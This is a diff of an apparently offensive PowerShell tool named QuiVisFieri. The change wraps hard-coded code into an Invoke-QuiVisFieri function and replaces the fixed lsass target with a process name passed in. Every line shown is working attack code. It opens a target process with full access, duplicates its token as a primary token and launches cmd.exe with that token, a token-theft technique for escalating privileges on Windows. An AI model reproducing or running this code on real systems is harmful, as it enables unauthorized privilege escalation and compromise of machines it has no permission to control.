@@ -241,16 +241,27 @@ namespace QuiVisFieri
 }
 "@
 
-$pi = [QuiVisFieri.AdvApi32+PROCESS_INFORMATION]::new()
-$si = [QuiVisFieri.AdvApi32+STARTUPINFO]::new()
-$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
-$si.lpDesktop = "Winsta0\Default"
+function Invoke-QuiVisFieri {
+	param (
+		[string[]]$ProcessName
+	)
+	
+	# Initialization of required structures	
+	$pi = [QuiVisFieri.AdvApi32+PROCESS_INFORMATION]::new()
+	$si = [QuiVisFieri.AdvApi32+STARTUPINFO]::new()
+	$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
+	$si.lpDesktop = "Winsta0\Default"
 
-$hLsass = [QuiVisFieri.Kernel32]::OpenProcess(0x001FFFFF, 0, (Get-Process lsass).Id)
-$htLsass = 0
-[QuiVisFieri.AdvApi32]::OpenProcessToken($hLsass, [QuiVisFieri.AdvApi32]::TOKEN_DUPLICATE, [ref]$htLsass)
-
-$phDtoken = 0
-[QuiVisFieri.AdvApi32]::DuplicateTokenEx($htLsass, [QuiVisFieri.AdvApi32]::TOKEN_ALL_ACCESS, 0, [QuiVisFieri.AdvApi32+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation, [QuiVisFieri.AdvApi32+TOKEN_TYPE]::TokenPrimary, [ref]$phDtoken)
-
-[QuiVisFieri.AdvApi32]::CreateProcessWithTokenW($phDtoken, 0, "cmd.exe", "", 0x00000020, 0, 0, [ref]$si, [ref]$pi)
+	# Opening of a handle to target process
+	$hTarget = [QuiVisFieri.Kernel32]::OpenProcess(0x001FFFFF, 0, (Get-Process $ProcessName).Id)
+	$htTarget = 0
+	# Opening of a handle to target process token
+	$optSuccess = [QuiVisFieri.AdvApi32]::OpenProcessToken($hTarget, [QuiVisFieri.AdvApi32]::TOKEN_DUPLICATE, [ref]$htTarget)
+	
+	# Target process' token duplication
+	$phDtoken = 0
+	$dteSuccess = [QuiVisFieri.AdvApi32]::DuplicateTokenEx($htTarget, [QuiVisFieri.AdvApi32]::TOKEN_ALL_ACCESS, 0, [QuiVisFieri.AdvApi32+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation, [QuiVisFieri.AdvApi32+TOKEN_TYPE]::TokenPrimary, [ref]$phDtoken)
+	
+	# Spawn CMD with duplicated token
+	[QuiVisFieri.AdvApi32]::CreateProcessWithTokenW($phDtoken, 0, "cmd.exe", "", 0x00000020, 0, 0, [ref]$si, [ref]$pi)
+}
